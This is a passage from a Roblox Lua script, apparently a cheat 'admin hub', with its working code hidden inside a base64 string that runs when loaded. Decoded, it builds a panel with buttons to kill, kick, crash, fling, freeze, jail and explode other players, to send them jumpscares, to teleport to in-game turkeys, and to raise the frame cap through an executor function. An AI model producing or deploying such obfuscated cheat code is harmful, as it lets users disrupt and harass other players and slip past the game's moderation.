2xvcjMgPSBhY2NlbnRCZwogICAgaGVhZGVyLlpJbmRleCA9IDEwCiAgICBoZWFkZXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwwLDAsMCkKICAgIGhlYWRlci5BY3RpdmUgPSB0cnVlCiAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgaGVhZGVyKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAyMCkKICAgIGxvY2FsIGhlYWRlclRpdGxlID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBoZWFkZXIpCiAgICBoZWFkZXJUaXRsZS5UZXh0ID0gIkF1cmFseW54IEhVQiAtIEFkbWluIFBhbmVsIgogICAgaGVhZGVyVGl0bGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBoZWFkZXJUaXRsZS5UZXh0U2l6ZSA9IDIyCiAgICBoZWFkZXJUaXRsZS5UZXh0Q29sb3IzID0gdmlvbGV0CiAgICBoZWFkZXJUaXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgaGVhZGVyVGl0bGUuU2l6ZSA9IFVEaW0yLm5ldygxLDAsMCwzNCkKICAgIGhlYWRlclRpdGxlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsMTAsMCwxNCkKICAgIGhlYWRlclRpdGxlLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICBoZWFkZXJUaXRsZS5aSW5kZXggPSAxMQogICAgY3JlYXRlR3JhZGllbnRBbmltKGhlYWRlclRpdGxlLCBDb2xvclNlcXVlbmNlLm5ld3sKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDEyOCwwLDI1NSkpLAogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC40NSwgQ29sb3IzLmZyb21SR0IoOTAsMCwxNzApKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuOCwgQ29sb3IzLmZyb21SR0IoMjU1LDI1NSwyNTUpKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEuMCwgQ29sb3IzLmZyb21SR0IoMTcwLDAsMjIwKSksCiAgICB9LDEuNSkKCiAgICBsb2NhbCByb3VuZE1pbkJ0biA9IEluc3RhbmNlLm5ldygiSW1hZ2VCdXR0b24iKQogICAgcm91bmRNaW5CdG4uU2l6ZSA9IFVEaW0yLm5ldygwLDQyLDAsNDIpCiAgICByb3VuZE1pbkJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAzNCwgMCwgNjYpCiAgICByb3VuZE1pbkJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgcm91bmRNaW5CdG4uSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzEyNjMzNTY4MDM1ODg3OCIKICAgIHJvdW5kTWluQnRuLlpJbmRleCA9IDEwMDAwCiAgICByb3VuZE1pbkJ0bi5QYXJlbnQgPSBzY3JlZW5HdWkKICAgIGxvY2FsIHVpY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICB1aWNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAxMikKICAgIHVpY29ybmVyLlBhcmVudCA9IHJvdW5kTWluQnRuCgogICAgbG9jYWwgbWluaW1pemVkID0gZmFsc2UKICAgIHJvdW5kTWluQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIG1pbmltaXplZCA9IG5vdCBtaW5pbWl6ZWQKICAgICAgICBtYWluRnJhbWUuVmlzaWJsZSA9IG5vdCBtaW5pbWl6ZWQKICAgIGVuZCkKCiAgICBsb2NhbCB0YWJzQmFyID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIG1haW5GcmFtZSkKICAgIHRhYnNCYXIuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMzIsIDAsIDM3KQogICAgdGFic0Jhci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxNiwgMCwgNjYpCiAgICB0YWJzQmFyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICB0YWJzQmFyLlpJbmRleCA9IDEwMDAKICAgIGxvY2FsIHRhYlNjcm9sbCA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiLCB0YWJzQmFyKQogICAgdGFiU2Nyb2xsLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgIHRhYlNjcm9sbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLDAsMCwwKQogICAgdGFiU2Nyb2xsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICB0YWJTY3JvbGwuU2Nyb2xsQmFyVGhpY2tuZXNzID0gMAogICAgdGFiU2Nyb2xsLkNhbnZhc1NpemUgPSBVRGltMi5uZXcoMCwwLDAsMCkKICAgIHRhYlNjcm9sbC5BdXRvbWF0aWNDYW52YXNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlgKICAgIHRhYlNjcm9sbC5aSW5kZXggPSAxMDAxCiAgICBsb2NhbCB0YWJMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIsIHRhYlNjcm9sbCkKICAgIHRhYkxheW91dC5GaWxsRGlyZWN0aW9uID0gRW51bS5GaWxsRGlyZWN0aW9uLkhvcml6b250YWwKICAgIHRhYkxheW91dC5QYWRkaW5nID0gVURpbS5uZXcoMCw4KQogICAgdGFiTGF5b3V0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICBsb2NhbCB0YWJzID0gewogICAgICAgIHtuYW1lID0gImNtZHMiLCBsYWJlbCA9ICJDb21tYW5kcyJ9LAogICAgICAgIHtuYW1lID0gInRlcnJvciIsIGxhYmVsID0gIkp1bXBzY2FyZXMifSwKICAgICAgICB7bmFtZSA9ICJwbGF5ZXJzIiwgbGFiZWwgPSAiUGxheWVyJ3MgTGlzdCJ9LAogICAgfQogICAgbG9jYWwgdGFiRnJhbWVzID0ge30KICAgIGxvY2FsIHRhYkJ1dHRvbnMgPSB7fQogICAgbG9jYWwgc2VsZWN0ZWRUYWIgPSAxCiAgICBmb3IgaSwgdGFiIGluIGlwYWlycyh0YWJzKSBkbwogICAgICAgIGxvY2FsIGJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIsIHRhYlNjcm9sbCkKICAgICAgICBidG4uU2l6ZSA9IFVEaW0yLm5ldygwLCAxMTYsIDAsIDMyKQogICAgICAgIGJ0bi5UZXh0ID0gdGFiLmxhYmVsCiAgICAgICAgYnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIGJ0bi5UZXh0U2l6ZSA9IDE1CiAgICAgICAgYnRuLlRleHRDb2xvcjMgPSB2aW9sZXQKICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IGFjY2VudEJnCiAgICAgICAgYnRuLlpJbmRleCA9IDEwMDIKICAgICAgICBidG4uQXV0b0J1dHRvbkNvbG9yID0gdHJ1ZQogICAgICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBidG4pLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDEsIDApCiAgICAgICAgc3R5bGVCdXR0b24oYnRuKQogICAgICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgc2VsZWN0ZWRUYWIgPSBpCiAgICAgICAgICAgIGZvciBpZHgsIGZyYW1lIGluIGlwYWlycyh0YWJGcmFtZXMpIGRvCiAgICAgICAgICAgICAgICBmcmFtZS5WaXNpYmxlID0gKGlkeCA9PSBzZWxlY3RlZFRhYikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgICAgIHRhYkJ1dHRvbnNbaV0gPSBidG4KICAgICAgICBsb2NhbCBmcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBtYWluRnJhbWUpCiAgICAgICAgZnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMzIsIDEsIC0xMTApCiAgICAgICAgZnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTYsIDAsIDEwNCkKICAgICAgICBmcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gYWNjZW50QmcKICAgICAgICBmcmFtZS5WaXNpYmxlID0gKGkgPT0gMSkKICAgICAgICBmcmFtZS5aSW5kZXggPSAxMDAKICAgICAgICB0YWJGcmFtZXNbaV0gPSBmcmFtZQogICAgZW5kCgogICAgLS0gQ29tYW5kb3MKICAgIGRvCiAgICAgICAgbG9jYWwgZnJhbWUgPSB0YWJGcmFtZXNbMV0KICAgICAgICBsb2NhbCBzY3JvbGwgPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIiwgZnJhbWUpCiAgICAgICAgc2Nyb2xsLlNpemUgPSBVRGltMi5uZXcoMSwtMjAsMSwtMjApCiAgICAgICAgc2Nyb2xsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsMTAsMCwxMCkKICAgICAgICBzY3JvbGwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBzY3JvbGwuU2Nyb2xsQmFyVGhpY2tuZXNzID0gOAogICAgICAgIHNjcm9sbC5BdXRvbWF0aWNDYW52YXNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlkKICAgICAgICBzY3JvbGwuWkluZGV4ID0gMTAxCiAgICAgICAgbG9jYWwgbGlzdCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0Iiwgc2Nyb2xsKQogICAgICAgIGxpc3QuUGFkZGluZyA9IFVEaW0ubmV3KDAsOCkKICAgICAgICBsaXN0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gYnV0dG9uKHRleHQsIGNtZCwgZm9yY2VOb1BsYXllcikKICAgICAgICAgICAgbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgc2Nyb2xsKQogICAgICAgICAgICBidG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAtMTIsIDAsIDM2KQogICAgICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IGFjY2VudEJnCiAgICAgICAgICAgIGJ0bi5UZXh0Q29sb3IzID0gdmlvbGV0CiAgICAgICAgICAgIGJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICAgICAgYnRuLlRleHRTaXplID0gMTYKICAgICAgICAgICAgYnRuLlRleHQgPSB0ZXh0CiAgICAgICAgICAgIGJ0bi5BdXRvQnV0dG9uQ29sb3IgPSB0cnVlCiAgICAgICAgICAgIGJ0bi5aSW5kZXggPSAxMDIKICAgICAgICAgICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGJ0bikuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwgMCkKICAgICAgICAgICAgc3R5bGVCdXR0b24oYnRuKQogICAgICAgICAgICBidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBpZiBmb3JjZU5vUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBTZW5kQ29tbWFuZCgiOyIuLmNtZCkKICAgICAgICAgICAgICAgIGVsc2VpZiBzZWxlY3RlZFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgU2VuZFRvU2VsZWN0ZWRQbGF5ZXIoY21kKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGJ0bi5UZXh0ID0gIuKaoO+4j++4sVNlbGVjdCBhIHBsYXllci4iCiAgICAgICAgICAgICAgICAgICAgd2FpdCgxLjIpCiAgICAgICAgICAgICAgICAgICAgYnRuLlRleHQgPSB0ZXh0CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICByZXR1cm4gYnRuCiAgICAgICAgZW5kCiAgICAgICAgYnV0dG9uKCJLaWxsIiwgImtpbGwiKQogICAgICAgIGJ1dHRvbigiS2lsbCBQbHVzIiwgImtpbGxwbHVzIikKICAgICAgICBidXR0b24oIktpY2siLCAia2ljayIpCiAgICAgICAgYnV0dG9uKCJDcmFzaCIsICJjcmFzaCIpCiAgICAgICAgYnV0dG9uKCJCcmluZyIsICJicmluZyIpCiAgICAgICAgYnV0dG9uKCJGbGluZyIsICJmbGluZyIpCiAgICAgICAgYnV0dG9uKCJGcmVlemUiLCAiZnJlZXplIikKICAgICAgICBidXR0b24oIlVuZnJlZXplIiwgInVuZnJlZXplIikKICAgICAgICBidXR0b24oIkphaWwiLCAiamFpbCIpCiAgICAgICAgYnV0dG9uKCJVbmphaWwiLCAidW5qYWlsIikKICAgICAgICBidXR0b24oIkV4cGxvZGUiLCAiRXhwbG9kZSIpCiAgICAgICAgYnV0dG9uKCJLaWxsSnVtcCIsICJraWxsanVtcCIpCiAgICAgICAgYnV0dG9uKCJVbmtpbGxKdW1wIiwgInVua2lsbGp1bXAiKQogICAgICAgIGJ1dHRvbigiU2t5IEZyZWV6ZSIsICJza3lmcmVlemUiKQogICAgICAgIAogICAgZW5kCiAgICAKICAgIGRvCiAgICAgICAgbG9jYWwgZnJhbWUgPSB0YWJGcmFtZXNbMl0KICAgICAgICBsb2NhbCBzY3JvbGwgPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIiwgZnJhbWUpCiAgICAgICAgc2Nyb2xsLlNpemUgPSBVRGltMi5uZXcoMSwtMjAsMSwtMjApCiAgICAgICAgc2Nyb2xsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsMTAsMCwxMCkKICAgICAgICBzY3JvbGwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBzY3JvbGwuU2Nyb2xsQmFyVGhpY2tuZXNzID0gOAogICAgICAgIHNjcm9sbC5BdXRvbWF0aWNDYW52YXNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlkKICAgICAgICBzY3JvbGwuWkluZGV4ID0gMTAxCiAgICAgICAgbG9jYWwgbGlzdCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0Iiwgc2Nyb2xsKQogICAgICAgIGxpc3QuUGFkZGluZyA9IFVEaW0ubmV3KDAsOCkKICAgICAgICBsaXN0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gYnV0dG9uKHRleHQsIGp1bXBzY2FyZUlkKQogICAgICAgICAgICBsb2NhbCBidG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCBzY3JvbGwpCiAgICAgICAgICAgIGJ0bi5TaXplID0gVURpbTIubmV3KDEsIC0xMiwgMCwgMzYpCiAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gYWNjZW50QmcKICAgICAgICAgICAgYnRuLlRleHRDb2xvcjMgPSB2aW9sZXQKICAgICAgICAgICAgYnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgICAgICBidG4uVGV4dFNpemUgPSAxNgogICAgICAgICAgICBidG4uVGV4dCA9IHRleHQKICAgICAgICAgICAgYnRuLkF1dG9CdXR0b25Db2xvciA9IHRydWUKICAgICAgICAgICAgYnRuLlpJbmRleCA9IDEwMgogICAgICAgICAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgYnRuKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygxLCAwKQogICAgICAgICAgICBzdHlsZUJ1dHRvbihidG4pCiAgICAgICAgICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIHNlbGVjdGVkUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBTZW5kVG9TZWxlY3RlZFBsYXllcihqdW1wc2NhcmVJZCkKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBidG4uVGV4dCA9ICLimqDvuI/vuLFTZWxlY3QgYSBwbGF5ZXIuIgogICAgICAgICAgICAgICAgICAgIHdhaXQoMS4yKQogICAgICAgICAgICAgICAgICAgIGJ0bi5UZXh0ID0gdGV4dAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgICAgICBidXR0b24oIkp1bXBzY2FyZSAxIiwgImp1bXBzMSIpCiAgICAgICAgYnV0dG9uKCJKdW1wc2NhcmUgMiIsICJqdW1wczIiKQogICAgICAgIGJ1dHRvbigiSnVtcHNjYXJlIDMiLCAianVtcHMzIikKICAgICAgICBidXR0b24oIkp1bXBzY2FyZSA0IiwgImp1bXBzNCIpCiAgICBlbmQKCiAgICBkbwogICAgICAgIGxvY2FsIGZyYW1lID0gdGFiRnJhbWVzWzNdCiAgICAgICAgbG9jYWwgc2Nyb2xsID0gSW5zdGFuY2UubmV3KCJTY3JvbGxpbmdGcmFtZSIsIGZyYW1lKQogICAgICAgIHNjcm9sbC5TaXplID0gVURpbTIubmV3KDEsLTIwLDEsLTYwKQogICAgICAgIHNjcm9sbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLDEwLDAsMTApCiAgICAgICAgc2Nyb2xsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgc2Nyb2xsLlNjcm9sbEJhclRoaWNrbmVzcyA9IDgKICAgICAgICBzY3JvbGwuQXV0b21hdGljQ2FudmFzU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZCiAgICAgICAgc2Nyb2xsLlpJbmRleCA9IDEwMQogICAgICAgIGxvY2FsIGxpc3QgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIsIHNjcm9sbCkKICAgICAgICBsaXN0LlBhZGRpbmcgPSBVRGltLm5ldygwLDgpCiAgICAgICAgbGlzdC5Tb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgoKICAgICAgICBwbGF5ZXJCdXR0b25SZWZzID0ge30KCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gaGlnaGxpZ2h0UGxheWVyQnV0dG9uKHNlbGVjdGVkKQogICAgICAgICAgICBmb3IgcGxyLGJ0biBpbiBwYWlycyhwbGF5ZXJCdXR0b25SZWZzKSBkbwogICAgICAgICAgICAgICAgaWYgcGxyID09IHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsMCwwKQogICAgICAgICAgICAgICAgICAgIGJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwyNTUsMCkKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsMCwwKQogICAgICAgICAgICAgICAgICAgIGJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LDAsMCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gbWFrZVBsYXllcnNMaXN0KCkKICAgICAgICAgICAgZm9yIF8sY2hpbGQgaW4gaXBhaXJzKHNjcm9sbDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgaWYgY2hpbGQ6SXNBKCJUZXh0QnV0dG9uIikgdGhlbiBjaGlsZDpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBwbGF5ZXJCdXR0b25SZWZzID0ge30KICAgICAgICAgICAgc2VsZWN0ZWRQbGF5ZXIgPSBuaWwKICAgICAgICAgICAgZm9yIF8scGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIHBsciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgc2Nyb2xsKQogICAgICAgICAgICAgICAgICAgIGJ0bi5TaXplID0gVURpbTIubmV3KDEsIC0xMiwgMCwgMzYpCiAgICAgICAgICAgICAgICAgICAgYnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLDAsMCkKICAgICAgICAgICAgICAgICAgICBidG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwyNTUsMjU1KQogICAgICAgICAgICAgICAgICAgIGJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICAgICAgICAgICAgICBidG4uVGV4dFNpemUgPSAxNgogICAgICAgICAgICAgICAgICAgIGJ0bi5UZXh0ID0gcGxyLk5hbWUKICAgICAgICAgICAgICAgICAgICBidG4uQXV0b0J1dHRvbkNvbG9yID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIGJ0bi5aSW5kZXggPSAxMDIKICAgICAgICAgICAgICAgICAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgYnRuKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygxLCAwKQogICAgICAgICAgICAgICAgICAgIHN0eWxlQnV0dG9uKGJ0bikKICAgICAgICAgICAgICAgICAgICBwbGF5ZXJCdXR0b25SZWZzW3Bscl0gPSBidG4KICAgICAgICAgICAgICAgICAgICBidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGVjdGVkUGxheWVyID0gcGxyCiAgICAgICAgICAgICAgICAgICAgICAgIGhpZ2hsaWdodFBsYXllckJ1dHRvbihwbHIpCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBtYWtlUGxheWVyc0xpc3QoKQogICAgICAgIFBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChtYWtlUGxheWVyc0xpc3QpCiAgICAgICAgUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KG1ha2VQbGF5ZXJzTGlzdCkKCiAgICAgICAgbG9jYWwgdXBkYXRlQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgZnJhbWUpCiAgICAgICAgdXBkYXRlQnRuLlNpemUgPSBVRGltMi5uZXcoMCwgMTI4LCAwLCAzMikKICAgICAgICB1cGRhdGVCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTEzOCwgMSwgLTQyKQogICAgICAgIHVwZGF0ZUJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTI4LDAsMjU1KQogICAgICAgIHVwZGF0ZUJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LDI1NSwyNTUpCiAgICAgICAgdXBkYXRlQnRuLlRleHQgPSAiVXBkYXRlIExpc3QiCiAgICAgICAgdXBkYXRlQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIHVwZGF0ZUJ0bi5UZXh0U2l6ZSA9IDE1CiAgICAgICAgdXBkYXRlQnRuLlpJbmRleCA9IDEwMQogICAgICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCB1cGRhdGVCdG4pLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDEsIDApCiAgICAgICAgc3R5bGVCdXR0b24odXBkYXRlQnRuKQogICAgICAgIHVwZGF0ZUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KG1ha2VQbGF5ZXJzTGlzdCkKICAgIGVuZAoKICAgIGZvciBpZHgsIGZyYW1lIGluIGlwYWlycyh0YWJGcmFtZXMpIGRvIGZyYW1lLlZpc2libGUgPSAoaWR4ID09IHNlbGVjdGVkVGFiKSBlbmQKZW5kCgpDcmVhdGVBZG1pblVJKCkKICAgIGVuZAp9KQoKbG9jYWwgVGFiMjAgPSBXaW5kb3c6TWFrZVRhYih7Iu+4sVR1cmtleSIsICJyYnhhc3NldGlkOi8vMTAxMDE2NzQxMzc1MzM3In0pCgpsb2NhbCBUdXJrZXlEcm9wZG93biAtLSByZWZlcsOqbmNpYSBwYXJhIHJlY3JpYXIgZGVwb2lzCgpsb2NhbCBmdW5jdGlvbiBjcmVhdGVEcm9wZG93bigpCiAgICBpZiBUdXJrZXlEcm9wZG93biB0aGVuCiAgICAgICAgVHVya2V5RHJvcGRvd246RGVzdHJveSgpCiAgICBlbmQKCiAgICBsb2NhbCBsaXN0ID0ge30KICAgIGxvY2FsIGZvbGRlciA9IHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiVGhhbmtzZ2l2aW5nVHVya2V5cyIpCiAgICBpZiBmb2xkZXIgdGhlbgogICAgICAgIGZvciBfLCB2IGluIGlwYWlycyhmb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgdjpJc0EoIk1vZGVsIikgdGhlbgogICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGxpc3QsIHYuTmFtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBUdXJrZXlEcm9wZG93biA9IFRhYjIwOkFkZERyb3Bkb3duKHsKICAgICAgICBOYW1lID0gIlRlbGVwb3J0IFR1cmtleSIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiQ2hvb3NlIGEgdHVya2V5IHRvIHRlbGVwb3J0OiIsCiAgICAgICAgT3B0aW9ucyA9IGxpc3QsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihvcHRpb24pCiAgICAgICAgICAgIGxvY2FsIHR1cmtleUZvbGRlciA9IHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiVGhhbmtzZ2l2aW5nVHVya2V5cyIpCiAgICAgICAgICAgIGlmIG5vdCB0dXJrZXlGb2xkZXIgdGhlbiByZXR1cm4gZW5kCgogICAgICAgICAgICBsb2NhbCB0dXJrZXlNb2RlbCA9IHR1cmtleUZvbGRlcjpGaW5kRmlyc3RDaGlsZChvcHRpb24pCiAgICAgICAgICAgIGlmIHR1cmtleU1vZGVsIGFuZCB0dXJrZXlNb2RlbDpJc0EoIk1vZGVsIikgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgaHJwID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICBpZiBocnAgdGhlbgogICAgICAgICAgICAgICAgICAgIGhycC5DRnJhbWUgPSB0dXJrZXlNb2RlbDpHZXRNb2RlbENGcmFtZSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgd2FybigiTW9kZWwgbm90IGZvdW5kOiIsIG9wdGlvbikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQplbmQKCmNyZWF0ZURyb3Bkb3duKCkKCmxvY2FsIHR1cmtleXNGb2xkZXIgPSB3b3Jrc3BhY2U6V2FpdEZvckNoaWxkKCJUaGFua3NnaXZpbmdUdXJrZXlzIikKCnR1cmtleXNGb2xkZXIuQ2hpbGRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGNyZWF0ZURyb3Bkb3duKCkKZW5kKQoKdHVya2V5c0ZvbGRlci5DaGlsZFJlbW92ZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICBjcmVhdGVEcm9wZG93bigpCmVuZCkKCmxvY2FsIEZQU19WQUxVRSA9IDI0MApsb2NhbCBGSU5BTCA9IG1hdGguY2xhbXAoRlBTX1ZBTFVFLCAxLCAxMDAwKQoKcGNhbGwoZnVuY3Rpb24oKQogICAgc2V0ZnBzY2FwKEZJTkFMKQplbmQpCgpnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5SZW5kZXJTdGVwcGVkOk9uY2UoZnVuY3Rpb24oKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIHNldGZwc2NhcChGSU5BTCkKICAgIGVuZCkKZW5kKQ==]]))()
